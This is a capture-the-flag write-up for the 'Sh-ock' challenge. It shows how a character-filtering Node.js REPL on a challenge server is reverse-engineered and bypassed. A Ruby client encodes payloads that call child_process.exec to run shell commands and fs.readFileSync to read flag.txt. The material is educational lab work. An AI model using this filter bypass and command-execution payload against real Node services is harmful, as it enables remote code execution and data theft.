#Sh-ock
###(exp90, solved by 105)


>Description: This is some kind of weird thing. I am sh-ocked.

>Service: 188.166.133.53:12589

First thing is first, let's see what we are working with...

`telnet 188.166.133.53 12589`

We are greeted with a small prompt where we can input data, let's try some stuff:

```
$test
[ReferenceError: te is not defined]
```

That's weird, what kind of error is this? A quick Google search on the error provides information that this is likely a JavaScript error. So, it looks like we are working with some kind of JavaScript shell, and it's likely Node.

We input `test` and got `te` back... So, it reversed our input and grabbed ever other character... Interesting....

Let's try something else:

```
$01234567890123456789012345
[ReferenceError: 284062 is not defined]
```

Hrmmmm...
```
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5
    ^       ^       ^       ^       ^       ^
```

Instead of every other character, now it's every third character...

After some vigorous attempts at figuring out how the filter was working, it was found that if the input exceeds 50 characters, it will take every 6th character. This means that as long as our input is greater than or equal to 9 bytes in length, we can just reverse our input and repeat each character 6 times. If the input is less than 9 characters, we could simply add a comment section to fulfill those bytes.

Okay, so now that we have figured out the filter, let's throw some JavaScript related queries at it (Some code pastes will be shortened for the sake of this writeup's length)

Let's run the command `this` and see how it responds. We can accomplish this by padding our extra 5 bytes with a JavaScript comment, reverse it and repeat each character 6 times. This will make our input 54 bytes long, allowing it to bypass the filter properly.

`//////////////////////////////ssssssiiiiiihhhhhhtttttt`


```
$//////////////////////////////ssssssiiiiiihhhhhhtttttt
Interface {
  _sawReturn: false,
  domain: null,
  _events:
   { close: { [Function: g] listener: [Function] },
     line: [Function] },
  _eventsCount: 2,
  _maxListeners: undefined,
  output:
   Socket {
     _connecting: false,
     _hadError: false,
     _handle:
      TCP {
        _externalStream: {},
```

Okay, this is interesting. It appears to have dropped us an object list of it's properties!

Let's try and execute `process` now

```
$////////////sssssssssssseeeeeeccccccoooooorrrrrrpppppp
process {
  title: '/opt/nodejs/bin/node',
  version: 'v4.3.0',
  moduleLoadList:
   [ 'Binding contextify',
     'Binding natives',
     'NativeModule events',
     'NativeModule buffer',
     'Binding buffer',
     'NativeModule internal/util',
     'Binding util',
     'NativeModule timers',
     'Binding timer_wrap',
     'NativeModule _linklist',
     'NativeModule assert',
     'NativeModule util',
     'Binding uv',
     'NativeModule path',
     'NativeModule module',
     'NativeModule internal/module',
     'NativeModule vm',
     'NativeModule fs',
     'Binding fs',
     'NativeModule constants',
     'Binding constants',
     'NativeModule stream',
     'NativeModule _stream_readable',
     'NativeModule _stream_writable',
     'NativeModule _stream_duplex',
     'NativeModule _stream_transform',
     'NativeModule _stream_passthrough',
     'Binding fs_event_wrap',
     'NativeModule readline',
     'Binding tty_wrap',
     'NativeModule net',
     'Binding cares_wrap',
     'Binding tcp_wrap',
     'Binding pipe_wrap',
     'Binding stream_wrap',
     'NativeModule string_decoder',
     'NativeModule console' ],
  versions:
   { http_parser: '2.5.1',
     node: '4.3.0',
     v8: '4.5.103.35',
     uv: '1.8.0',
     zlib: '1.2.8',
     ares: '1.10.1-DEV',
     icu: '56.1',
     modules: '46',
     openssl: '1.0.2f' },
  arch: 'x64',
  platform: 'linux',
  release:
   { name: 'node',
     lts: 'Argon',
     sourceUrl: 'https://nodejs.org/download/release/v4.3.0/node-v4.3.0.tar.gz',
     headersUrl: 'https://nodejs.org/download/release/v4.3.0/node-v4.3.0-headers.tar.gz' },
  argv: [ '/opt/node-v4.3.0-linux-x64/bin/node', '/home/exp90/task.js' ],
  execArgv: [],
  env:
   { OLDPWD: '/etc/service/exp90',
     PATH: '/command:/usr/local/bin:/usr/local/sbin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/X11R6/bin',
```

Awesome!

At this point, I'm tired of reversing my input and manually repeating characters, so I made a script in Ruby. It will connect and execute some initial commands, and then give me a prompt to input whatever else I would like to run in the same session.

(This code can be found in exp90.rb)
```
#!/usr/bin/ruby
require 'socket'
HOST      = '188.166.133.53'
PORT      = 12589

@sock = TCPSocket.new(HOST, PORT)
@initial_payloads = ["this.sys=require('sys')", "this.ex=require('child_process').exec", 'this.ex("ls -la", function(error, stdout, stderr) { console.log(stdout); })']

def send_data(stuff)
  puts "PLOAD: #{stuff}"
  @sock.write("#{stuff.to_s}\n")
end

def generate_payload(input)
  pl = ''
  reverse = input.reverse
  reverse.split('').each do |c|
    pl += (c * 6)
  end
  send_data(pl)
  @initial_payloads.shift
end

def custom_input(input)
  pl = ''
  reverse = input.reverse
  reverse.split('').each do |c|
    pl += (c * 6)
  end
  send_data(pl)
end

loop do
  @data = @sock.recv(1024)
  puts @data unless @data.empty?
  if @initial_payloads.size >= 1
    generate_payload(@initial_payloads[0])
  else
    print '> '
    i = gets.chomp
    custom_input(i)
  end
end
```

As you can see the initial payloads will create a variable within the object called sys, which will require system and the next command following that will try and dump the contents of the directory!

Upon running, we get the directory dump!!!

```
drwxr-x---  2 exp90 exp90 4096 Feb 19 14:26 .
drwxr-xr-x 14 root  root  4096 Feb 11 12:19 ..
-rw-------  1 exp90 exp90    6 Feb 19 14:26 .bash_history
-rw-r--r--  1 exp90 exp90  220 Nov 13  2014 .bash_logout
-rw-r--r--  1 exp90 exp90 3515 Nov 13  2014 .bashrc
-rw-r--r--  1 exp90 exp90  675 Nov 13  2014 .profile
-rw-r--r--  1 root  exp90   24 Feb 11 18:23 flag.txt
-rw-r--r--  1 root  exp90 1011 Feb 11 18:23 task.js
```

The final thing to do is to read the contents of the `flag.txt` file.
We need to require the `fs` module and store it in a variable associated with the object. We can then use this to read from files.

Running it in le script

```
> this.f=require('fs')
> this.f.readFileSync('flag.txt','utf8')
```

Desired output? I think so!

```
IW{Shocked-for-nothing!
>
```
